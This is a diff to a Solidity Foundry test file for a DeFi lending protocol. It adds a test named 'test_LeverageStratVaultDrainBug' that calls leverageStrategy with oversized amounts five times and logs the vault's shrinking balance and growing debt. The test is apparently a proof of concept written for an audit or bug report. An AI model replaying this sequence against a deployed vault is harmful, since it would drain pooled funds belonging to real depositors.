@@ -33,7 +33,7 @@ contract LendingTest is Setup, ExponentialNoError {
         // send some numa to userA
         vm.stopPrank();
         vm.startPrank(deployer);
-        numa.transfer(userA, 1000 ether);
+        numa.transfer(userA, 9000000 ether);
 
         // create pool Reth/numa and strategy
         uint NumaAmountPool = numaPoolReserve;
@@ -185,6 +185,189 @@ contract LendingTest is Setup, ExponentialNoError {
             console2.log("loss");
             console2.log(numaBalBefore - numaBalAfter);
         }
+
+        vm.stopPrank();
+    }
+
+     function test_LeverageStratVaultDrainBug() public {
+
+
+        vm.prank(deployer);
+        vault.setMaxBorrow(1000000000 ether);
+
+        vm.prank(deployer);
+        vault.setMaxPercent(1000);
+
+        // user calls leverage x 5
+        vm.startPrank(userA);
+        address[] memory t = new address[](1);
+        t[0] = address(cNuma);
+        comptroller.enterMarkets(t);
+
+        uint numaBalBefore = numa.balanceOf(userA);
+
+        uint providedAmount2 = 2000000 ether;
+        uint leverageAmount2 = 8000000 ether;
+
+        uint totalCollateral = providedAmount2 + leverageAmount2;
+        numa.approve(address(cReth), providedAmount2);
+
+        // call strategy
+        uint strategyindex = 0;
+        cReth.leverageStrategy(
+            providedAmount2,
+            leverageAmount2,
+            cNuma,
+            strategyindex
+        );
+
+        // check balances
+        // cnuma position
+        uint cNumaBal = cNuma.balanceOf(userA);
+        console2.log(cNumaBal);
+
+        //uint exchangeRate = cNuma.exchangeRateStored();
+        Exp memory exchangeRate = Exp({mantissa: cNuma.exchangeRateStored()});
+
+        uint mintTokens = div_(totalCollateral, exchangeRate);
+
+        assertEq(cNumaBal, mintTokens);
+
+        // numa stored in cnuma contract
+        uint numaBal = numa.balanceOf(address(cNuma));
+        assertEq(numaBal, totalCollateral);
+
+        // borrow balance
+        uint borrowrEThBalance = cReth.borrowBalanceCurrent(userA);
+
+        console2.log(borrowrEThBalance);
+
+        (, uint ltv) = comptroller.getAccountLTVIsolate(userA, cNuma, cReth);
+        console2.log("ltv");
+        console2.log(ltv);
+
+        // vault balance
+        console2.log("vault balance",rEth.balanceOf(address(vault)));
+        console2.log("vault debt",vault.getDebt());
+
+        // 2nd time
+         numa.approve(address(cReth), providedAmount2);
+
+        // call strategy
+        cReth.leverageStrategy(
+            providedAmount2,
+            leverageAmount2,
+            cNuma,
+            strategyindex
+        );
+
+        // check balances
+        // cnuma position
+        cNumaBal = cNuma.balanceOf(userA);
+        console2.log(cNumaBal);
+
+
+        // borrow balance
+        borrowrEThBalance = cReth.borrowBalanceCurrent(userA);
+
+        console2.log(borrowrEThBalance);
+
+        (, ltv) = comptroller.getAccountLTVIsolate(userA, cNuma, cReth);
+        console2.log("ltv");
+        console2.log(ltv);
+
+        // vault balance
+        console2.log("vault balance 2",rEth.balanceOf(address(vault)));
+        console2.log("vault debt 2",vault.getDebt());
+       
+               numa.approve(address(cReth), providedAmount2);
+
+        // call strategy
+        cReth.leverageStrategy(
+            providedAmount2,
+            leverageAmount2,
+            cNuma,
+            strategyindex
+        );
+
+        // check balances
+        // cnuma position
+        cNumaBal = cNuma.balanceOf(userA);
+        console2.log(cNumaBal);
+
+
+        // borrow balance
+        borrowrEThBalance = cReth.borrowBalanceCurrent(userA);
+
+        console2.log(borrowrEThBalance);
+
+        (, ltv) = comptroller.getAccountLTVIsolate(userA, cNuma, cReth);
+        console2.log("ltv");
+        console2.log(ltv);
+
+        // vault balance
+        console2.log("vault balance 3",rEth.balanceOf(address(vault)));
+        console2.log("vault debt 3",vault.getDebt());
+       
+                       numa.approve(address(cReth), providedAmount2);
+
+        // call strategy
+        cReth.leverageStrategy(
+            providedAmount2,
+            leverageAmount2,
+            cNuma,
+            strategyindex
+        );
+
+        // check balances
+        // cnuma position
+        cNumaBal = cNuma.balanceOf(userA);
+        console2.log(cNumaBal);
+
+
+        // borrow balance
+        borrowrEThBalance = cReth.borrowBalanceCurrent(userA);
+
+        console2.log(borrowrEThBalance);
+
+        (, ltv) = comptroller.getAccountLTVIsolate(userA, cNuma, cReth);
+        console2.log("ltv");
+        console2.log(ltv);
+
+        // vault balance
+        console2.log("vault balance 4",rEth.balanceOf(address(vault)));
+        console2.log("vault debt 4",vault.getDebt());
+
+        providedAmount2 = 1000000 ether;
+        leverageAmount2 = 4000000 ether;
+               numa.approve(address(cReth), providedAmount2);
+
+        // call strategy
+        cReth.leverageStrategy(
+            providedAmount2,
+            leverageAmount2,
+            cNuma,
+            strategyindex
+        );
+
+        // check balances
+        // cnuma position
+        cNumaBal = cNuma.balanceOf(userA);
+        console2.log(cNumaBal);
+
+
+        // borrow balance
+        borrowrEThBalance = cReth.borrowBalanceCurrent(userA);
+
+        console2.log(borrowrEThBalance);
+
+        (, ltv) = comptroller.getAccountLTVIsolate(userA, cNuma, cReth);
+        console2.log("ltv");
+        console2.log(ltv);
+
+        // vault balance
+        console2.log("vault balance 5",rEth.balanceOf(address(vault)));
+        console2.log("vault debt 5",vault.getDebt());
 
         vm.stopPrank();
     }
